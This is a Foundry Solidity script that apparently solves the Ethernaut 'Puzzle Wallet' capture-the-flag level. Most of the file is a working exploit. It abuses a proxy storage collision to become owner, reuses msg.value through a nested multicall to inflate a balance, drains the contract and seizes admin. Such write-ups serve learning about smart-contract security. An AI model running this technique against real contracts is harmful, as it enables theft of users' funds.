// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/24-PuzzleWallet.sol"; 


contract Exp is Script {

    //PuzzleWallet public PuzzleWalletInstance = PuzzleWallet(payable(/*获取的实例地址*/));
    PuzzleWallet PuzzleWalletInstance = PuzzleWallet(payable(/*获取的实例地址*/));
    PuzzleProxy PuzzleProxyInstance = PuzzleProxy(payable(/*获取的实例地址*/));   
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 

    // function attack() public {

    // }
    //https://github.com/az0mb13/ethernaut-foundry/blob/master/script/level24.sol
    function run() external{
        vm.startBroadcast();

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(PuzzleWalletInstance.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(PuzzleWalletInstance.deposit.selector);
        
        nestedMulticall[1] = abi.encodeWithSelector(PuzzleWalletInstance.multicall.selector, depositSelector);

        PuzzleProxyInstance.proposeNewAdmin(hacker);
        PuzzleWalletInstance.addToWhitelist(hacker);
        PuzzleWalletInstance.multicall{value: 0.001 ether}(nestedMulticall);
        PuzzleWalletInstance.execute(hacker, 0.002 ether, "");
        PuzzleWalletInstance.setMaxBalance(uint256(uint160(hacker)));
        console.log("New Admin is : ", PuzzleProxyInstance.admin());


        vm.stopBroadcast();
    }
}